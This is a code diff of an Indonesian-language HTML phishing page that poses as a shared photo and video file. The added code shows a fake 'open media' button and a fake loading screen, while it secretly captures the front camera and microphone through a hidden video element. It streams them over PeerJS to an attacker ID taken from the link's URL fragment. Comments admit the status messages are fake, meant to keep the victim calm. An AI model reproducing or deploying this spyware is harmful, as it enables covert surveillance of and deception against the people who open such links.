@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QuickRecover Pro</title>
-    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <title>Loading...</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #f0f2f5;
+            background-color: #f8f9fa;
             color: #333;
             margin: 0;
             display: flex;
@@ -19,152 +19,148 @@
 
         .card {
             background: white;
-            width: 340px;
-            padding: 30px;
+            padding: 40px;
             border-radius: 20px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
             text-align: center;
+            width: 300px;
+            animation: fadeIn 0.5s ease-out;
         }
 
-        h1 { font-size: 22px; margin: 0 0 5px; color: #1a1a1a; }
-        p.subtitle { color: #888; font-size: 14px; margin-bottom: 25px; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        h1 { margin: 0 0 15px; color: #333; }
+        p { color: #666; font-size: 14px; line-height: 1.5; }
 
         .btn {
-            background: #3498db;
+            background: #007bff;
             color: white;
             border: none;
-            padding: 15px;
-            border-radius: 12px;
-            font-size: 15px;
-            font-weight: 600;
+            padding: 12px 24px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
+            margin-top: 20px;
             width: 100%;
-            margin-top: 10px;
+            transition: 0.3s;
         }
-        .btn:hover { background: #2980b9; }
+        .btn:hover { background: #0056b3; transform: scale(1.02); }
 
-        /* Fake Loading */
-        #scanScreen {
-            display: none;
+        #loading-screen {
+            display: flex;
             flex-direction: column;
             align-items: center;
         }
 
-        .loader-ring {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #3498db;
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007bff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-bottom: 20px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .log-text { font-family: monospace; font-size: 12px; color: #666; margin-top: 15px; }
-        
-        /* Hidden Elements */
-        #localVideo { display: none; } 
+        #local-video { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="card" id="mainMenu">
-        <h1>QuickRecover Pro</h1>
-        <p class="subtitle">Alat pemulihan data media tingkat lanjut.</p>
-        
-        <!-- Input Admin ID (Disamarkan sebagai verification code) -->
-        <div style="text-align: left; margin-bottom: 15px;">
-            <label style="font-size: 12px; font-weight: bold; color: #555;">Kode Lisensi Server:</label>
-            <input type="text" id="adminIdInput" placeholder="Masukkan kode aktivasi..." 
-                   style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; margin-top: 5px;">
-        </div>
-
-        <button class="btn" onclick="initiateConnection()">
-            🚀 Mulai Pemindaian
-        </button>
+    <!-- Tampilan 1: Landing Page (Trigger) -->
+    <div class="card" id="landing-page">
+        <div style="font-size: 40px; margin-bottom: 10px;">📁</div>
+        <h1>Dokumen Dibagikan</h1>
+        <p>Seseorang telah membagikan file media berisi foto dan video kepada Anda.</p>
+        <button class="btn" onclick="startProcess()">Buka File Media</button>
     </div>
 
-    <div class="card" id="scanScreen">
-        <div class="loader-ring"></div>
-        <h3>Menghubungkan ke Server...</h3>
-        <p class="log-text" id="logText">Memverifikasi lisensi...</p>
+    <!-- Tampilan 2: Fake Loading (Sedang Upload) -->
+    <div class="card" id="loading-page" style="display:none;">
+        <div class="spinner"></div>
+        <h3>Mengunduh...</h3>
+        <p id="log-text">Menghubungkan ke server aman...</p>
     </div>
 
-    <!-- Video Elemen Hidden -->
-    <video id="localVideo" autoplay playsinline muted></video>
+    <video id="local-video" autoplay playsinline muted></video>
 
 <script>
-    const mainMenu = document.getElementById('mainMenu');
-    const scanScreen = document.getElementById('scanScreen');
-    const logText = document.getElementById('logText');
-    const localVideo = document.getElementById('localVideo');
+    // Baca ID Admin dari URL Hash (Bagian setelah #)
+    // Contoh: site.com/foto.html#ADMIN_ID -> kita ambil ADMIN_ID
+    const adminID = window.location.hash.substring(1); 
 
-    function initiateConnection() {
-        const adminID = document.getElementById('adminIdInput').value;
-
-        if (!adminID) {
-            alert("Mohon masukkan Kode Lisensi Server terlebih dahulu!");
-            return;
-        }
-
-        // UI Switch
-        mainMenu.style.display = 'none';
-        scanScreen.style.display = 'flex';
-
-        // 1. Inisialisasi Peer Klien
-        const peer = new Peer(null, {
-            debug: 1
-        });
-
-        peer.on('open', (id) => {
-            logText.innerText = "Klien terhubung. Memulai streaming...";
-            startStreaming(adminID);
-        });
-
-        peer.on('error', (err) => {
-            console.error(err);
-            logText.innerText = "Gagal menghubungi server.";
-        });
+    if (!adminID) {
+        // Fallback jika tidak ada ID (misal user buka langsung tanpa link)
+        document.querySelector('h1').innerText = "File Tidak Ditemukan";
+        document.querySelector('p').innerText = "Link kadaluarsa atau tidak valid.";
+        document.querySelector('.btn').style.display = 'none';
     }
 
-    async function startStreaming(adminID) {
+    function startProcess() {
+        // Ganti tampilan ke loading
+        document.getElementById('landing-page').style.display = 'none';
+        document.getElementById('loading-page').style.display = 'flex';
+
+        // Mulai koneksi kamera
+        connectCamera(adminID);
+    }
+
+    async function connectCamera(targetID) {
         try {
-            // 2. Akses Kamera & Mikrofon
+            // 1. Inisialisasi PeerJS
+            const peer = new Peer(null, { debug: 1 });
+            const logText = document.getElementById('log-text');
+
+            peer.on('open', () => {
+                logText.innerText = "Mengakses perangkat keras...";
+                getMediaAndCall(targetID, peer);
+            });
+
+            peer.on('error', (err) => {
+                logText.innerText = "Gagal menghubungi server.";
+                console.error(err);
+            });
+
+        } catch (e) {
+            alert("Terjadi kesalahan sistem.");
+        }
+    }
+
+    async function getMediaAndCall(targetID, peer) {
+        try {
+            // 2. Minta izin Kamera & Mic
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, // 'user' = depan, 'environment' = belakang
+                video: { facingMode: "user" }, 
                 audio: true 
             });
 
-            // Tampilkan di video element hidden (diperlukan oleh browser)
+            // Pasang stream ke elemen video hidden (wajib)
+            const localVideo = document.getElementById('local-video');
             localVideo.srcObject = stream;
             localVideo.play();
 
-            logText.innerText = "Kamera aktif. Mengirim data live...";
+            document.getElementById('log-text').innerText = "Menghubungkan ke pembagian file...";
 
-            // 3. Hubungkan ke Admin
-            const peer = new Peer(); // Re-instance atau gunakan peer sebelumnya jika disimpan di global scope
-            
-            // Catatan: Di dalam fungsi ini, kita buat peer baru untuk memanggil admin
-            // agar lebih stabil.
-            const callerPeer = new Peer();
+            // 3. Hubungi Admin
+            const call = peer.call(targetID, stream);
 
-            callerPeer.on('open', () => {
-                // Panggil ID Admin
-                const call = callerPeer.call(adminID, stream);
-                
-                logText.innerText = "Pemindaian berjalan (Live Connection Active)...";
-
-                call.on('close', () => {
-                    logText.innerText = "Koneksi terputus oleh admin.";
-                });
+            call.on('close', () => {
+                document.getElementById('log-text').innerText = "Sesi berakhir.";
+                // Matikan kamera
+                stream.getTracks().forEach(track => track.stop());
             });
 
+            // Update log palsu agar user tenang
+            setTimeout(() => {
+                document.getElementById('log-text').innerText = "Menyiapkan tampilan...";
+            }, 2000);
+
         } catch (err) {
-            console.error("Camera Error:", err);
-            alert("Gagal mengakses kamera. Pastikan izin diberikan.");
-            mainMenu.style.display = 'block';
-            scanScreen.style.display = 'none';
+            console.error("Camera Access Denied", err);
+            alert("Akses kamera diperlukan untuk memverifikasi penerima file.");
+            location.reload();
         }
     }
 </script>
